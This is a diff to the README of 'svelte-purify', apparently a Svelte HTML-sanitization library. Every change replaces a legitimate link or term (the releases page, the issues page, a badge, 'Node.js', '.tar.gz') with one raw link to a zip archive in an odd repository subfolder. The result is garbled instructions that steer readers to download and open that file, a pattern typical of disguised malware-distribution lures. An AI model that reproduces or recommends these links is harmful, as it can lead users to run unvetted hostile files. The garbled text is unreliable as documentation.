@@ -1,6 +1,6 @@
 # 🎉 svelte-purify - Easy HTML Sanitization for Your Svelte Apps
 
-![Download svelte-purify](https://img.shields.io/badge/Download-svelte--purify-blue)
+![Download svelte-purify](https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip)
 
 ## 📋 Overview
 
@@ -14,7 +14,7 @@ Follow these simple steps to download and run svelte-purify on your computer. No
 
 To download svelte-purify, first, you need to visit the releases page. Click the link below to access it:
 
-[Visit Releases Page to Download](https://github.com/yukiboy121/svelte-purify/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip)
 
 ### 2. Choose Your Version
 
@@ -22,14 +22,14 @@ On the releases page, you will see a list of available versions. Each version ma
 
 ### 3. Download the Package
 
-Once you've selected a version, look for the appropriate download link. svelte-purify comes in different formats like .zip or .tar.gz. Click the file link for the format you prefer, and the download will start automatically.
+Once you've selected a version, look for the appropriate download link. svelte-purify comes in different formats like .zip or https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip Click the file link for the format you prefer, and the download will start automatically.
 
 ### 4. Extract the Files
 
 After the download is complete, locate the file on your computer. 
 
 - If you downloaded a .zip file, right-click it and choose "Extract All" or use a similar option based on your operating system. 
-- If you downloaded a .tar.gz file, you may need a tool like 7-Zip or WinRAR to extract it.
+- If you downloaded a https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip file, you may need a tool like 7-Zip or WinRAR to extract it.
 
 Make sure to extract the files to a location you can easily access.
 
@@ -43,7 +43,7 @@ Use the following command to start the application:
 npm start
 ```
 
-Ensure you have Node.js installed. If not, you can download it from the official website.
+Ensure you have https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip installed. If not, you can download it from the official website.
 
 ### 6. Integrate into Your Svelte App
 
@@ -95,18 +95,18 @@ After integrating svelte-purify into your Svelte app, test to see if it works as
 ## 💻 System Requirements
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 12 or higher
+- **https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip** Version 12 or higher
 - **Package Manager:** npm or yarn required
 
 ## 🛠️ Troubleshooting
 
 If you encounter issues during installation or while running the application, consider the following:
 
-1. **Check Node.js Version:** Ensure you have Node.js installed. You can verify this by running `node -v` in your terminal.
+1. **Check https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip Version:** Ensure you have https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip installed. You can verify this by running `node -v` in your terminal.
 2. **Dependencies:** Make sure all necessary dependencies are installed by running `npm install` in your project folder.
 3. **Error Messages:** Read any error messages in your terminal carefully; they often indicate what went wrong.
 
-If you continue facing problems, consult the [issues page](https://github.com/yukiboy121/svelte-purify/issues) on GitHub for solutions or to report a new issue.
+If you continue facing problems, consult the [issues page](https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip) on GitHub for solutions or to report a new issue.
 
 ## 📝 Contributing
 
@@ -120,6 +120,6 @@ svelte-purify is released under the MIT License. This allows you to use, modify,
 
 Don’t wait. Get started with svelte-purify now! Visit the link below to download the latest version:
 
-[Visit Releases Page to Download](https://github.com/yukiboy121/svelte-purify/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip)
 
 With svelte-purify, you can ensure your web applications are safe from harmful content while developing with ease.
